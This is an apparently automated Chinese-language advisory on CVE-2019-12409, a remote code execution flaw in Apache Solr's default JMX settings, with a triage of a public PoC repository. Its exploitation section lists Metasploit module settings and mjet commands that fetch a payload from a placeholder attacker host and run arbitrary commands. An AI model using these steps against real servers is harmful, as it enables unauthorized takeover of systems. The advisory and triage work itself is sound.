## CVE-2019-12409 Apache Solr RCE

**漏洞编号:** CVE-2019-12409

**漏洞类型:** 远程代码执行

**影响应用:** Apache Solr

**危害等级:** 高危，可完全控制服务器

**影响版本:** 8.1.1 and 8.2.0 for Linux

**利用条件:** 需要目标服务器开启JMX且18983端口对外开放, 并且使用存在漏洞的默认配置 solr.in.sh

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-12409 漏洞是由于 Apache Solr 8.1.1 和 8.2.0 版本中默认的 `solr.in.sh` 配置文件中 `ENABLE_REMOTE_JMX_OPTS` 配置项存在不安全设置引起的远程代码执行漏洞。如果使用了受影响版本的默认 `solr.in.sh` 文件，则 JMX 监控将在 RMI_PORT（默认 18983）上启用并暴露，且无需身份验证。如果防火墙允许入站流量访问此端口，则任何具有网络访问权限的人都可以访问 JMX，进而可以上传恶意代码在 Solr 服务器上执行。

**有效性：**
提供的POC代码显示了两种利用方式，使用 Metasploit 和 mjet 工具。 Metasploit 模块 `exploit/multi/misc/java_jmx_server` 被成功用于获取 Meterpreter shell。mjet 工具也提供了安装和执行命令的方式，并且提供了攻击示例，这些都表明POC代码是有效的，可以用于远程代码执行。

**投毒风险：**
*   **README.md:**  包含漏洞描述和利用截图，没有发现恶意代码。
*   **solr.in.sh:** 展示了启用 `ENABLE_REMOTE_JMX_OPTS` 的配置，没有发现恶意代码。
*   **nmap 扫描信息:** 只是端口扫描结果，没有恶意代码。
*   **Metasploit 利用过程:**  使用了 Metasploit 框架的标准模块，风险较低。
*   **mjet 工具利用过程:**  `mjet.py` 是一个 Python 脚本，可能存在风险。`jython-standalone-2.7.0.jar` 是 Jython 解释器，也可能存在风险。`qgmncrbu.jar` 是恶意 payload，风险最高。

总体来看，主要风险在于`mjet.py`脚本和恶意payload `qgmncrbu.jar`，可能存在投毒代码，但是没有进一步分析，因此根据经验判断投毒风险为10%。

**利用方式：**
1.  **确定目标 Solr 服务器版本:** 确认目标服务器运行的是 Apache Solr 8.1.1 或 8.2.0。
2.  **检查 JMX 端口 (18983) 是否开放:** 使用 `nmap` 或类似工具扫描目标服务器的 18983 端口，确认端口是否对外开放。
3.  **使用 Metasploit:**
    *   加载 `exploit/multi/misc/java_jmx_server` 模块。
    *   设置 `RHOSTS` 为目标服务器 IP 地址。
    *   设置 `RPORT` 为 18983。
    *   设置 `LHOST` 和 `LPORT` 为攻击者监听地址和端口。
    *   运行 `exploit` 命令。
4.  **使用 mjet 工具：**
    *   使用 Jython 运行 `mjet.py` 脚本，指定目标 IP 地址、端口和 payload URL。
    *   例如：`java -jar jython-standalone-2.7.0.jar mjet.py <target_ip> 18983 install super_secret http://<attacker_ip>:8000/ 8000`
    *   然后，可以使用 `command` 参数执行任意命令。 例如： `java -jar jython-standalone-2.7.0.jar mjet.py 127.0.0.1 18983 command super_secret "id&&pwd&&ls"`

**项目地址:** [jas502n/CVE-2019-12409](https://github.com/jas502n/CVE-2019-12409)

**漏洞详情:** [CVE-2019-12409](https://nvd.nist.gov/vuln/detail/CVE-2019-12409)